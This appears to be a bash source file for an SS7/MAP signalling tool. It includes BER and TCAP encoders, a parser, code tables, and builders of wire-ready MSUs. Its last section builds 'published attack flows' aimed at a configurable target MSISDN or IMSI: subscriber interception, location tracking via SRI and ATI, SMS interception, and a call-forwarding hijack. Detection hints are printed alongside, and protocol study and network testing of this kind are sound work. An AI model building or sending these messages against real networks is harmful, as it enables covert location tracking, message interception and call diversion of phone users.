# MAP invoke component: A1 { invokeID INTEGER, opCode INTEGER, parameter }.
ss7_map_invoke() {
    local iid="${1:-1}" op="${2:-}" arg="${3:-}"
    [[ "$op" =~ ^[0-9]+$ ]] || return 1
    arg=$(ss7_nfc "$arg"); ss7_is_hex "$arg" || arg=""
    local inner
    inner="$(ss7_ber_int "$iid")$(ss7_ber_int "$op")$arg"
    ss7_tlv A1 "$inner"
}

# Parse a TCAP message (optionally the SCCP payload of an MSU) and report the
# transaction portion plus every component. Emits TSV rows.
ss7_tcap_parse() {
    local hex; hex=$(ss7_nfc "${1:-}")
    ss7_is_hex "$hex" && (( ${#hex} >= 4 )) || { printf 'ERROR\tTCAP needs hex\n' >&2; return 1; }
    local off=0 got=0 comps="" tag
    while (( off * 2 < ${#hex} )); do
        ss7_ber_at "$hex" "$off" || break
        tag="$SS7_BTAG"
        local ohl="$SS7_BHL" olen="$SS7_BLEN" oval="$SS7_BVAL"
        case "$tag" in
            48) printf 'otid\t%s\n' "$oval" ;;
            49) printf 'dtid\t%s\n' "$oval" ;;
            6B) printf 'dialog_portion_len\t%s\n' "$olen" ;;
            6C) comps="$oval"; got=1 ;;
            61|62|64|65|67)
                printf 'tcap_message_type\t%s\n' "$(ss7_tcap_msg_name "$tag")"
                printf 'tcap_tag\t%s\n' "$tag" ;;
        esac
        if [[ "$tag" == "61" || "$tag" == "62" || "$tag" == "64" || "$tag" == "65" || "$tag" == "67" ]]; then
            # The component portion sits inside the transaction portion for
            # the messages Wireshark accepts (nested form), so recurse one
            # level into the transaction content.
            local sub="$oval" soff=0 stab
            while (( soff * 2 < ${#sub} )); do
                ss7_ber_at "$sub" "$soff" || break
                stab="$SS7_BTAG"
                local shl="$SS7_BHL" slen="$SS7_BLEN"
                case "$stab" in
                    48) printf 'otid\t%s\n' "$SS7_BVAL" ;;
                    49) printf 'dtid\t%s\n' "$SS7_BVAL" ;;
                    6B) printf 'dialog_portion_len\t%s\n' "$slen" ;;
                    6C) comps="$SS7_BVAL"; got=1 ;;
                esac
                soff=$(( soff + shl + slen ))
            done
        fi
        off=$(( off + ohl + olen ))
    done
    (( got )) || { printf 'WARN\tno component portion found\n' >&2; }
    [[ -n "$comps" ]] || return 0
    ss7_tcap_parse_components "$comps"
}

ss7_tcap_parse_components() {
    local hex="${1^^}" off=0 idx=0
    while (( off * 2 < ${#hex} )); do
        ss7_ber_at "$hex" "$off" || { printf 'ERROR\tmalformed component at octet %s\n' "$off" >&2; return 1; }
        local ctag="$SS7_BTAG" cval="$SS7_BVAL"
        # Save the component's own header/length before the inner reads
        # overwrite the SS7_B* globals, or the loop advances by the wrong
        # amount and a second component is parsed out of the first one's tail.
        local chl="$SS7_BHL" clen="$SS7_BLEN"
        local cname; cname=$(ss7_tcap_component_name "$ctag")
        local iid="" op="" opname="" param="" pval=""
        local is_err=0 is_rej=0
        [[ "$ctag" == "A3" ]] && is_err=1
        [[ "$ctag" == "A4" ]] && is_rej=1
        local ioff=0 itag
        if (( ${#cval} >= 4 )); then
            ss7_ber_at "$cval" 0 && itag="$SS7_BTAG"
            if [[ "$itag" == "02" ]]; then
                iid=$(( 16#$SS7_BVAL ))
                ioff=$(( SS7_BHL + SS7_BLEN ))
            fi
        fi
        if (( ioff * 2 < ${#cval} )); then
            ss7_ber_at "$cval" "$ioff" && itag="$SS7_BTAG"
            if [[ "$itag" == "30" ]]; then
                # Q.773 §3.3: a returnResult is SEQUENCE { invokeID,
                # result SEQUENCE { opcode, result } }. Without entering that
                # inner SEQUENCE the answering operation has no name and the
                # whole response reads as one hex tail, so a reply to an SRI
                # never showed the roaming number it carried.
                cval="$SS7_BVAL"; ioff=0
                ss7_ber_at "$cval" 0 && itag="$SS7_BTAG"
            fi
            case "$itag" in
                02) op=$(( 16#$SS7_BVAL )); ioff=$(( ioff + SS7_BHL + SS7_BLEN )) ;;
                06) op="oid:${SS7_BVAL}"; ioff=$(( ioff + SS7_BHL + SS7_BLEN )) ;;
                80|81|82|83) op="$itag"; pval="$SS7_BVAL"
                            ioff=$(( ioff + SS7_BHL + SS7_BLEN )) ;;
            esac
        fi
        if (( ioff * 2 < ${#cval} )); then
            param="${cval:$((ioff*2))}"
        fi
        # The reject's problem detail IS its value, and it sits before the
        # tail the generic path reads.
        [[ -z "$param" ]] && param="$pval"
        # A3 carries an error code and A4 a problem tag: both are named from
        # their own tables, never from the operation-code table.
        if (( is_rej )) && [[ -n "$op" ]]; then
            opname=$(ss7_tcap_problem_name "$op")
            op=$(( 16#$op ))
        elif (( is_err )) && [[ "$op" =~ ^[0-9]+$ ]]; then
            opname=$(ss7_map_error_name "$op")
        elif [[ "$op" =~ ^[0-9]+$ ]]; then
            opname=$(ss7_map_opcode_name "$op")
        elif [[ -n "$op" ]]; then
            opname="global opcode (OID)"
        fi
        printf 'component\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$idx" "$cname" "${iid:-}" "${op:-}" "$opname" "${param:-}"
        idx=$(( idx + 1 ))
        off=$(( off + chl + clen ))
    done
    return 0
}

# ── MAP error codes — TS 29.002 §17.5 ───────────────────────────────────
# A returnError component carries an ERROR code, not an OPERATION code, and the
# two number spaces only look alike: error 4 is not "provideRoamingNumber", it
# is unassigned, and error 34 is systemFailure where operation 34 is
# sendRoutingInfoForLCS. Reading one as the other stamps a real error with the
# name of an unrelated operation.
#   2, 23, 24 are commented out by the clause (unknownBaseStation,
#   invalidTargetBaseStation, noRadioResourceAvailable): reserved, not assigned.
ss7_map_error_name() {
    case "${1:-}" in
        2)   echo "unknownBaseStation (withdrawn)" ;;
        23)  echo "invalidTargetBaseStation (withdrawn)" ;;
        24)  echo "noRadioResourceAvailable (withdrawn)" ;;
        1)   echo "unknownSubscriber" ;;
        3)   echo "unknownMSC" ;;
        5)   echo "unidentifiedSubscriber" ;;
        6)   echo "absentSubscriberSM" ;;
        7)   echo "unknownEquipment" ;;
        8)   echo "roamingNotAllowed" ;;
        9)   echo "illegalSubscriber" ;;
        10)  echo "bearerServiceNotProvisioned" ;;
        11)  echo "teleserviceNotProvisioned" ;;
        12)  echo "illegalEquipment" ;;
        13)  echo "callBarred" ;;
        14)  echo "forwardingViolation" ;;
        15)  echo "cug-Reject" ;;
        16)  echo "illegalSS-Operation" ;;
        17)  echo "ss-ErrorStatus" ;;
        18)  echo "ss-NotAvailable" ;;
        19)  echo "ss-SubscriptionViolation" ;;
        20)  echo "ss-Incompatibility" ;;
        21)  echo "facilityNotSupported" ;;
        22)  echo "ongoingGroupCall" ;;
        25)  echo "noHandoverNumberAvailable" ;;
        26)  echo "subsequentHandoverFailure" ;;
        27)  echo "absentSubscriber" ;;
        28)  echo "incompatibleTerminal" ;;
        29)  echo "shortTermDenial" ;;
        30)  echo "longTermDenial" ;;
        31)  echo "subscriberBusyForMT-SMS" ;;
        32)  echo "sm-DeliveryFailure" ;;
        33)  echo "messageWaitingListFull" ;;
        34)  echo "systemFailure" ;;
        35)  echo "dataMissing" ;;
        36)  echo "unexpectedDataValue" ;;
        37)  echo "pw-RegistrationFailure" ;;
        38)  echo "negativePW-Check" ;;
        39)  echo "noRoamingNumberAvailable" ;;
        40)  echo "tracingBufferFull" ;;
        42)  echo "targetCellOutsideGroupCallArea" ;;
        43)  echo "numberOfPW-AttemptsViolation" ;;
        44)  echo "numberChanged" ;;
        45)  echo "busySubscriber" ;;
        46)  echo "noSubscriberReply" ;;
        47)  echo "forwardingFailed" ;;
        48)  echo "or-NotAllowed" ;;
        49)  echo "ati-NotAllowed" ;;
        50)  echo "noGroupCallNumberAvailable" ;;
        51)  echo "resourceLimitation" ;;
        52)  echo "unauthorizedRequestingNetwork" ;;
        53)  echo "unauthorizedLCSClient" ;;
        54)  echo "positionMethodFailure" ;;
        58)  echo "unknownOrUnreachableLCSClient" ;;
        59)  echo "mm-EventNotSupported" ;;
        60)  echo "atsi-NotAllowed" ;;
        61)  echo "atm-NotAllowed" ;;
        62)  echo "informationNotAvailable" ;;
        71)  echo "unknownAlphabet" ;;
        72)  echo "ussd-Busy" ;;
        *)   echo "unassigned/unknown" ;;
    esac
}

# Q.773 §3.3.4: the reject component's problem is a CHOICE tagged
# [0] generalProblem, [1] invokeProblem, [2] returnResultProblem,
# [3] returnErrorProblem.
ss7_tcap_problem_name() {
    case "${1:-}" in
        80) echo "generalProblem" ;;
        81) echo "invokeProblem" ;;
        82) echo "returnResultProblem" ;;
        83) echo "returnErrorProblem" ;;
        *)  echo "unknown problem" ;;
    esac
}

# ── MAP operation codes — TS 29.002 §17.5 ───────────────────────────────
# Three provenances, and the CLI says which one a code has:
#   active        the clause's `OPERATION ::= ... local:N` list (70 codes);
#   withdrawn     the clause comments the code out in §17.5 but keeps its name
#                 in the "-- withdrawn" block (11 codes: 9, 19, 28, 30, 31,
#                 32, 35, 48, 49, 52, 54). The code stays reserved, it is not
#                 assigned in this release;
#   dissector-only  Wireshark 4.2.2 names the code from an older release
#                 (16, 78-81, 109-126) and TS 29.002 V15.7.0 does not mention
#                 it at all, so a capture still decodes the name but the CLI
#                 must not claim the clause assigns it.
# Two rows (44, 46) are clause-sourced: Wireshark declines to decode them
# without an SMS application context, and the clause names them at 44/46.
# The clause and the dissector disagree in wording only on opcode 38: the
# clause says forwardCheckSS-Indication, the dissector prints forwardCheckSS.
ss7_map_opcode_name() {
    case "${1:-}" in
        2)   echo "updateLocation" ;;
        3)   echo "cancelLocation" ;;
        4)   echo "provideRoamingNumber" ;;
        5)   echo "noteSubscriberDataModified" ;;
        6)   echo "resumeCallHandling" ;;
        7)   echo "insertSubscriberData" ;;
        8)   echo "deleteSubscriberData" ;;
        10)  echo "registerSS" ;;
        11)  echo "eraseSS" ;;
        12)  echo "activateSS" ;;
        13)  echo "deactivateSS" ;;
        14)  echo "interrogateSS" ;;
        15)  echo "authenticationFailureReport" ;;
        16)  echo "notifySS" ;;
        17)  echo "registerPassword" ;;
        18)  echo "getPassword" ;;
        20)  echo "releaseResources" ;;
        21)  echo "mt-ForwardSM-VGCS" ;;
        22)  echo "sendRoutingInfo" ;;
        23)  echo "updateGprsLocation" ;;
        24)  echo "sendRoutingInfoForGprs" ;;
        25)  echo "failureReport" ;;
        26)  echo "noteMsPresentForGprs" ;;
        29)  echo "sendEndSignal" ;;
        33)  echo "processAccessSignalling" ;;
        34)  echo "forwardAccessSignalling" ;;
        36)  echo "cancelVcsgLocation" ;;
        37)  echo "reset" ;;
        38)  echo "forwardCheckSS-Indication" ;;
        39)  echo "prepareGroupCall" ;;
        40)  echo "sendGroupCallEndSignal" ;;
        41)  echo "processGroupCallSignalling" ;;
        42)  echo "forwardGroupCallSignalling" ;;
        43)  echo "checkIMEI" ;;
        44)  echo "mt-ForwardSM" ;;
        45)  echo "sendRoutingInfoForSM" ;;
        46)  echo "mo-ForwardSM" ;;
        47)  echo "reportSM-DeliveryStatus" ;;
        50)  echo "activateTraceMode" ;;
        51)  echo "deactivateTraceMode" ;;
        53)  echo "updateVcsgLocation" ;;
        55)  echo "sendIdentification" ;;
        56)  echo "sendAuthenticationInfo" ;;
        57)  echo "restoreData" ;;
        58)  echo "sendIMSI" ;;
        59)  echo "processUnstructuredSS-Request" ;;
        60)  echo "unstructuredSS-Request" ;;
        61)  echo "unstructuredSS-Notify" ;;
        62)  echo "anyTimeSubscriptionInterrogation" ;;
        63)  echo "informServiceCentre" ;;
        64)  echo "alertServiceCentre" ;;
        65)  echo "anyTimeModification" ;;
        66)  echo "readyForSM" ;;
        67)  echo "purgeMS" ;;
        68)  echo "prepareHandover" ;;
        69)  echo "prepareSubsequentHandover" ;;
        70)  echo "provideSubscriberInfo" ;;
        71)  echo "anyTimeInterrogation" ;;
        72)  echo "ss-InvocationNotification" ;;
        73)  echo "setReportingState" ;;
        74)  echo "statusReport" ;;
        75)  echo "remoteUserFree" ;;
        76)  echo "registerCC-Entry" ;;
        77)  echo "eraseCC-Entry" ;;
        78)  echo "secureTransportClass1" ;;
        79)  echo "secureTransportClass2" ;;
        80)  echo "secureTransportClass3" ;;
        81)  echo "secureTransportClass4" ;;
        83)  echo "provideSubscriberLocation" ;;
        84)  echo "sendGroupCallInfo" ;;
        85)  echo "sendRoutingInfoForLCS" ;;
        86)  echo "subscriberLocationReport" ;;
        87)  echo "ist-Alert" ;;
        88)  echo "ist-Command" ;;
        89)  echo "noteMM-Event" ;;
        # Withdrawn: the clause keeps the name in its commented-out block
        # (-- sendParameters ... local:9). Reserved, not assigned.
        9)   echo "sendParameters" ;;
        19)  echo "processUnstructuredSS-Data" ;;
        28)  echo "performHandover" ;;
        30)  echo "performSubsequentHandover" ;;
        31)  echo "provideSIWFSNumber" ;;
        32)  echo "siwfs-SignallingModify" ;;
        35)  echo "noteInternalHandover" ;;
        48)  echo "noteSubscriberPresent" ;;
        49)  echo "alertServiceCentreWithoutResult" ;;
        52)  echo "traceSubscriberActivity" ;;
        54)  echo "beginSubscriberActivity" ;;
        # Dissector-only: TS 29.002 V15.7.0 names none of these, Wireshark
        # 4.2.2 still does (16, 78-81 are the 1999 secure transport and
        # notifySS; 109-126 the LCS work items and CC-entry operands). Live
        # captures carry them, so the names stay, attributed as such.
        109) echo "lcs-PeriodicLocationCancellation" ;;
        110) echo "lcs-LocationUpdate" ;;
        111) echo "lcs-PeriodicLocationRequest" ;;
        112) echo "lcs-AreaEventCancellation" ;;
        113) echo "lcs-AreaEventReport" ;;
        114) echo "lcs-AreaEventRequest" ;;
        115) echo "lcs-MOLR" ;;
        116) echo "lcs-LocationNotification" ;;
        117) echo "callDeflection" ;;
        118) echo "userUserService" ;;
        119) echo "accessRegisterCCEntry" ;;
        120) echo "forwardCUG-Info" ;;
        121) echo "splitMPTY" ;;
        122) echo "retrieveMPTY" ;;
        123) echo "holdMPTY" ;;
        124) echo "buildMPTY" ;;
        125) echo "forwardChargeAdvice" ;;
        126) echo "explicitCT" ;;
        *)   echo "unassigned/unknown" ;;
    esac
}

ss7_opcode_known() {
    local n; n=$(ss7_map_opcode_name "${1:-}")
    [[ "$n" == "unassigned/unknown" ]] && return 1
    return 0
}

# The 11 codes §17.5 keeps in its commented-out "-- withdrawn" block: named,
# reserved, and NOT assigned in this release.
ss7_map_opcode_withdrawn() {
    case "${1:-}" in
        9|19|28|30|31|32|35|48|49|52|54) return 0 ;;
        *) return 1 ;;
    esac
}

# Codes only Wireshark 4.2.2 names (from a release before V15.7.0). Useful
# when reading a capture, but the clause does not assign them.
ss7_map_opcode_dissector() {
    case "${1:-}" in
        16|78|79|80|81|109|110|111|112|113|114|115|116|117|118|119|120|121|122|123|124|125|126) return 0 ;;
        *) return 1 ;;
    esac
}

# ── MAP SS-Code — TS 29.002 §17.7.5 ─────────────────────────────────────
# All 72 values the clause assigns, read back from Wireshark 4.2.2 with a
# registerSS invoke per value. The names follow the clause where the two
# differ: 144 is allBarringSS (the dissector still prints its pre-Rel-4 name
# allCallRestrictionSS), 178/179 are callSessionRelated/callSessionUnrelated
# (the dissector prints callrelated/callunrelated) and 250-255 use the
# clause's upper-case plmn-specificSS-A..F.
# The call-forwarding hijack needs cfu = 33, NOT 21: 21 is mci (malicious
# call identification). --selftest asserts both so a regression cannot
# silently register the wrong service.
ss7_ss_code_name() {
    case "${1:-}" in
        0)   echo "allSS" ;;
        # all line identification SS
        16)  echo "allLineIdentificationSS" ;;
        17)  echo "clip" ;;
        18)  echo "clir" ;;
        19)  echo "colp" ;;
        20)  echo "colr" ;;
        21)  echo "mci" ;;
        24)  echo "allNameIdentificationSS" ;;
        25)  echo "cnap" ;;
        # all call forwarding SS
        32)  echo "allForwardingSS" ;;
        33)  echo "cfu" ;;
        36)  echo "cd" ;;
        # all conditional forwarding SS
        40)  echo "allCondForwardingSS" ;;
        41)  echo "cfb" ;;
        42)  echo "cfnry" ;;
        43)  echo "cfnrc" ;;
        # all call offering SS
        48)  echo "allCallOfferingSS" ;;
        49)  echo "ect" ;;
        50)  echo "mah" ;;
        # all call completion SS
        64)  echo "allCallCompletionSS" ;;
        65)  echo "cw" ;;
        66)  echo "hold" ;;
        67)  echo "ccbs-A" ;;
        68)  echo "ccbs-B" ;;
        69)  echo "mc" ;;
        # all multiparty SS
        80)  echo "allMultiPartySS" ;;
        81)  echo "multiPTY" ;;
        # all community of interest SS
        96)  echo "allCommunityOfInterest-SS" ;;
        97)  echo "cug" ;;
        # all charging SS
        112) echo "allChargingSS" ;;
        113) echo "aoci" ;;
        114) echo "aocc" ;;
        # all additional information transfer SS
        128) echo "allAdditionalInfoTransferSS" ;;
        129) echo "uus1" ;;
        130) echo "uus2" ;;
        131) echo "uus3" ;;
        # all barring SS
        144) echo "allBarringSS" ;;
        145) echo "barringOfOutgoingCalls" ;;
        146) echo "baoc" ;;
        147) echo "boic" ;;
        148) echo "boicExHC" ;;
        153) echo "barringOfIncomingCalls" ;;
        154) echo "baic" ;;
        155) echo "bicRoam" ;;
        # all call priority SS
        160) echo "allCallPrioritySS" ;;
        161) echo "emlpp" ;;
        # all LCS privacy exception SS
        176) echo "allLCSPrivacyException" ;;
        177) echo "universal" ;;
        178) echo "callSessionRelated" ;;
        179) echo "callSessionUnrelated" ;;
        180) echo "plmnoperator" ;;
        181) echo "serviceType" ;;
        # all mobile originating location request SS
        192) echo "allMOLR-SS" ;;
        193) echo "basicSelfLocation" ;;
        194) echo "autonomousSelfLocation" ;;
        195) echo "transferToThirdParty" ;;
        # all PLMN specific SS
        240) echo "allPLMN-specificSS" ;;
        241) echo "plmn-specificSS-1" ;;
        242) echo "plmn-specificSS-2" ;;
        243) echo "plmn-specificSS-3" ;;
        244) echo "plmn-specificSS-4" ;;
        245) echo "plmn-specificSS-5" ;;
        246) echo "plmn-specificSS-6" ;;
        247) echo "plmn-specificSS-7" ;;
        248) echo "plmn-specificSS-8" ;;
        249) echo "plmn-specificSS-9" ;;
        250) echo "plmn-specificSS-A" ;;
        251) echo "plmn-specificSS-B" ;;
        252) echo "plmn-specificSS-C" ;;
        253) echo "plmn-specificSS-D" ;;
        254) echo "plmn-specificSS-E" ;;
        255) echo "plmn-specificSS-F" ;;
        *)   echo "unknown" ;;
    esac
}

# ── MAP message builders ────────────────────────────────────────────────
# Argument shapes below were each checked by building the message and having
# `tshark -V` report the field without a BER error (text2pcap -l 141). The
# context tags are the ones TS 29.002 actually assigns, so a wrong tag shows
# up as "expected class:CONTEXT tag:N but found ..." rather than passing.
ss7_arg_sri() {  # SendRoutingInfoArg ::= SEQUENCE { msisdn [0] }
    local mh; mh=$(ss7_msisdn_hex "${1:-}") || return 1
    ss7_tlv 30 "$(ss7_tlv 80 "$mh")"
}

ss7_arg_sri_sm() {  # { msisdn [0], sm-RP-PRI [1] BOOLEAN, serviceCentreAddress [2] }
    local mh sh
    mh=$(ss7_msisdn_hex "${1:-}") || return 1
    sh=$(ss7_msisdn_hex "${2:-33689000000}") || return 1
    ss7_tlv 30 "$(ss7_tlv 80 "$mh")$(ss7_tlv 81 01)$(ss7_tlv 82 "$sh")"
}

ss7_arg_ati() {  # { subscriberIdentity [0] CHOICE{imsi[0]}, requestedInfo [1], gsmSCF-Address [3] }
    local ih gh
    ih=$(ss7_imsi_hex "${1:-}") || return 1
    gh=$(ss7_msisdn_hex "${2:-33600000000}") || return 1
    ss7_tlv 30 "$(ss7_tlv A0 "$(ss7_tlv 80 "$ih")")$(ss7_tlv A1 "$(ss7_tlv 80 "")")$(ss7_tlv 83 "$gh")"
}

ss7_arg_psi() {  # { imsi [0], requestedInfo [1] { locationInformation [0], subscriberState [1] } }
    local ih; ih=$(ss7_imsi_hex "${1:-}") || return 1
    ss7_tlv 30 "$(ss7_tlv 80 "$ih")$(ss7_tlv A1 "$(ss7_tlv 80 "")$(ss7_tlv 81 "")")"
}

ss7_arg_ulr() {  # UpdateLocationArg ::= SEQUENCE { imsi, msc-Number [1], vlr-Number [2] }
    local ih mh vh
    ih=$(ss7_imsi_hex "${1:-}") || return 1
    mh=$(ss7_msisdn_hex "${2:-33600000000}") || return 1
    vh=$(ss7_msisdn_hex "${3:-33600000001}") || return 1
    ss7_tlv 30 "$(ss7_tlv 04 "$ih")$(ss7_tlv 81 "$mh")$(ss7_tlv 82 "$vh")"
}

ss7_arg_sai() {  # { imsi [0], numberOfRequestedVectors INTEGER }
    local ih; ih=$(ss7_imsi_hex "${1:-}") || return 1
    ss7_tlv 30 "$(ss7_tlv 80 "$ih")$(ss7_ber_int "${2:-5}")"
}

ss7_arg_isd() {  # InsertSubscriberDataArg ::= SEQUENCE { imsi, ... }
    local ih; ih=$(ss7_imsi_hex "${1:-}") || return 1
    ss7_tlv 30 "$(ss7_tlv 04 "$ih")"
}

ss7_arg_register_ss() {  # { ss-Code, forwardedToNumber [4] }
    local code="${1:-33}" fwd="${2:-}"
    [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 255 )) || return 1
    local body; body=$(ss7_tlv 04 "$(ss7_byte "$code")")
    if [[ -n "$fwd" ]]; then
        local fh; fh=$(ss7_msisdn_hex "$fwd") || return 1
        body+=$(ss7_tlv 84 "$fh")
    fi
    ss7_tlv 30 "$body"
}

ss7_arg_activate_ss() {  # { ss-Code }
    local code="${1:-33}"
    [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 255 )) || return 1
    ss7_tlv 30 "$(ss7_tlv 04 "$(ss7_byte "$code")")"
}

# MT-ForwardSM-Arg ::= SEQUENCE { sm-RP-DA, sm-RP-OA, sm-RP-UI SignalInfo }
# SM-RP-DA ::= CHOICE { imsi [0] IMSI, ... }; SM-RP-OA ::= CHOICE { serviceCentreAddressOA [4] AddressString }
# Spec-sourced from TS 29.002 §17.6 (Wireshark 4.2.2 does not decode opcode 44
# without an SMS application context, so this shape is not tshark-verified).
# The SM-RP-UI default is a valid GSM 03.40 §9.2.2.1 SMS-DELIVER with an
# 8-bit data coding scheme carrying "ABCD".
ss7_arg_mt_forward_sm() {
    local imsi="${1:-}" sc="${2:-33689000000}" ui="${3:-}"
    local ih sh
    ih=$(ss7_imsi_hex "$imsi") || return 1
    sh=$(ss7_msisdn_hex "$sc") || return 1
    [[ -n "$ui" ]] || ui="040B913361234567F8000424102030405000 0441424344"
    ui=$(ss7_nfc "$ui"); ss7_is_hex "$ui" || return 1
    ss7_tlv 30 "$(ss7_tlv A0 "$(ss7_tlv 80 "$ih")")$(ss7_tlv A1 "$(ss7_tlv 84 "$sh")")$(ss7_tlv 04 "$ui")"
}

# Assemble a complete, wire-ready MSU for a MAP invoke toward an HLR.
#   $1 opcode, $2 argument hex, $3 invoke id, $4 otid, $5 called SSN,
#   $6 calling SSN, $7 dpc, $8 opc
ss7_build_msu() {
    local op="${1:-}" arg="${2:-}" iid="${3:-1}" otid="${4:-00000001}"
    local cssn="${5:-6}" ossn="${6:-8}" dpc="${7:-1}" opc="${8:-2}"
    local inv tcap sccp
    inv=$(ss7_map_invoke "$iid" "$op" "$arg") || return 1
    tcap=$(ss7_tcap_begin "$otid" "$inv") || return 1
    sccp=$(ss7_sccp_build_udt "$dpc" "$cssn" "$opc" "$ossn" "$tcap") || return 1
    ss7_msu_build "$dpc" "$opc" 0 "$sccp"
}

# The public builders. Each prints the full MSU hex on stdout, one line.
# The argument builder's exit status is checked explicitly: an empty argument
# from a rejected MSISDN/IMSI must fail the build, not produce a
# syntactically valid invoke with no parameter.
#
# Point codes are the LAST two positional arguments (<dpc> <opc>, decimal
# 0-16383) on every builder; they default to the test label. The calling and
# called SSNs are deliberately NOT parameters: they encode the operation's
# real direction (ATI only legitimately originates at the GMLC, ISD only runs
# HLR -> VLR), so a caller-chosen SSN would let the build describe an exchange
# the protocol does not permit.
ss7_build_sri()    { local a; a=$(ss7_arg_sri    "${1:-}")            || return 1
                     ss7_build_msu 22 "$a" "${2:-1}" "${3:-00000001}" 6 8   "${4:-1}" "${5:-2}"; }
ss7_build_sri_sm() { local a; a=$(ss7_arg_sri_sm "${1:-}" "${2:-}")   || return 1
                     ss7_build_msu 45 "$a" "${3:-1}" "${4:-00000001}" 6 8   "${5:-1}" "${6:-2}"; }
# The GMLC (SSN 145) is the only legitimate ATI origin, so the reference
# build uses it; --detect flags anything else.
ss7_build_ati()    { local a; a=$(ss7_arg_ati    "${1:-}" "${2:-}")   || return 1
                     ss7_build_msu 71 "$a" "${3:-1}" "${4:-00000001}" 6 145 "${5:-1}" "${6:-2}"; }
# ProvideSubscriberInfo runs HLR -> VLR.
ss7_build_psi()    { local a; a=$(ss7_arg_psi    "${1:-}")            || return 1
                     ss7_build_msu 70 "$a" "${2:-1}" "${3:-00000001}" 7 6   "${4:-1}" "${5:-2}"; }
ss7_build_ulr()    { local a; a=$(ss7_arg_ulr    "${1:-}" "${2:-}" "${3:-}") || return 1
                     ss7_build_msu 2 "$a" "${4:-1}" "${5:-00000001}" 6 7   "${6:-1}" "${7:-2}"; }
ss7_build_sai()    { local a; a=$(ss7_arg_sai    "${1:-}" "${2:-5}")  || return 1
                     ss7_build_msu 56 "$a" "${3:-1}" "${4:-00000001}" 6 7   "${5:-1}" "${6:-2}"; }
ss7_build_isd()    { local a; a=$(ss7_arg_isd    "${1:-}")            || return 1
                     ss7_build_msu 7 "$a" "${2:-1}" "${3:-00000001}" 6 7   "${4:-1}" "${5:-2}"; }
# Supplementary-service management is VLR -> HLR.
ss7_build_register_ss() { local a; a=$(ss7_arg_register_ss "${1:-33}" "${2:-}") || return 1
                     ss7_build_msu 10 "$a" "${3:-1}" "${4:-00000002}" 6 7  "${5:-1}" "${6:-2}"; }
ss7_build_activate_ss() { local a; a=$(ss7_arg_activate_ss "${1:-33}") || return 1
                     ss7_build_msu 12 "$a" "${2:-1}" "${3:-00000002}" 6 7  "${4:-1}" "${5:-2}"; }

# ── published attack flows as real message sequences ────────────────────
# Each flow names its opcodes, builds the actual MSU for every step, and
# states the precondition. The opcode sequences are distinct, which the
# selftest asserts so a copy/paste regression cannot make two flows identical.
ss7_flow_opcodes() {
    case "${1:-}" in
        intercept)       printf '22,70' ;;
        locate)          printf '22,71' ;;
        sms-intercept)   printf '45,44' ;;
        forward-hijack)  printf '10,12' ;;
        *) return 1 ;;
    esac
}

# The flow identities default to the published test subscriber so the shape
# can be inspected without a target, but every one of them is an argument:
# a flow built for the test IMSI cannot be handed to a lab STP and aimed at
# the operator's own subscriber, which is the only way a flow is useful.
ss7_flow_def_msisdn() { printf '%s' "33612345678"; }
ss7_flow_def_imsi()   { printf '%s' "310150123456789"; }
ss7_flow_def_opc()    { printf '%s' "2"; }
ss7_flow_def_dpc()    { printf '%s' "1"; }

ss7_flow_build_step() {  # <flow> <step> <msisdn> <imsi> <opc> <dpc>
    local flow="${1:-}" n="${2:-1}" msisdn="${3:-}" imsi="${4:-}"
    local opc="${5:-}" dpc="${6:-}"
    case "$flow:$n" in
        intercept:1)       ss7_build_sri "$msisdn" 1 00000001 "$dpc" "$opc" ;;
        intercept:2)       ss7_build_psi "$imsi" 2 00000001 "$dpc" "$opc" ;;
        locate:1)          ss7_build_sri "$msisdn" 1 00000001 "$dpc" "$opc" ;;
        locate:2)          ss7_build_ati "$imsi" "" 2 00000001 "$dpc" "$opc" ;;
        sms-intercept:1)   ss7_build_sri_sm "$msisdn" "" 1 00000001 "$dpc" "$opc" ;;
        sms-intercept:2)   ss7_build_msu 44 "$(ss7_arg_mt_forward_sm "$imsi")" 2 00000001 8 8 "$dpc" "$opc" ;;
        forward-hijack:1)  ss7_build_register_ss 33 "$msisdn" 1 00000002 "$dpc" "$opc" ;;
        forward-hijack:2)  ss7_build_activate_ss 33 2 00000002 "$dpc" "$opc" ;;
        *) return 1 ;;
    esac
}

ss7_flow() {  # <flow> [msisdn] [imsi] [opc] [dpc]
    local flow="${1:-}" seq step op msu
    local msisdn="${2:-}" imsi="${3:-}" opc="${4:-}" dpc="${5:-}"
    seq=$(ss7_flow_opcodes "$flow") || {
        printf 'ERROR\tunknown flow: %s (want intercept|locate|sms-intercept|forward-hijack)\n' \
            "$(ss7_sanitize "${flow:-<none>}")" >&2
        return 2
    }
    [[ -n "$msisdn" ]] || msisdn=$(ss7_flow_def_msisdn)
    [[ -n "$imsi"   ]] || imsi=$(ss7_flow_def_imsi)
    [[ -n "$opc"    ]] || opc=$(ss7_flow_def_opc)
    [[ -n "$dpc"    ]] || dpc=$(ss7_flow_def_dpc)
    # The caller's identity and label are validated here rather than left to
    # the step builder, so a bad target fails before any hex is printed: a
    # flow whose first step is missing is worse than no flow at all.
    ss7_msisdn_hex "$msisdn" >/dev/null 2>&1 || {
        printf 'ERROR\tnot an encodable MSISDN: %s\n' "$(ss7_sanitize "$msisdn")" >&2; return 2; }
    ss7_imsi_hex "$imsi" >/dev/null 2>&1 || {
        printf 'ERROR\tnot an encodable IMSI: %s\n' "$(ss7_sanitize "$imsi")" >&2; return 2; }
    for pc in "$opc" "$dpc"; do
        [[ "$pc" =~ ^[0-9]+$ ]] && (( pc <= 16383 )) || {
            printf 'ERROR\tpoint code must be decimal 0-16383: %s\n' "$(ss7_sanitize "$pc")" >&2; return 2; }
    done
    printf 'flow\t%s\n' "$flow"
    printf 'opc\t%s\n'  "$opc"
    printf 'dpc\t%s\n'  "$dpc"
    printf 'msisdn\t%s\n' "$msisdn"
    printf 'imsi\t%s\n'   "$imsi"
    case "$flow" in
        intercept)
            printf 'objective\t%s\n' "resolve the serving VMSC from an MSISDN, then pull subscriber state and location from it"
            printf 'precondition\t%s\n' "MAP SSN 6/8 reachable over the interconnect; no SCCP screening of SRI at the HLR"
            printf 'detection\t%s\n' "an SRI whose calling SSN is not an MSC/VLR/HLR, or an SRI from a point code the HLR never serves"
            ;;
        locate)
            printf 'objective\t%s\n' "SRI to obtain the IMSI and serving VMSC, then ATI for the location estimate"
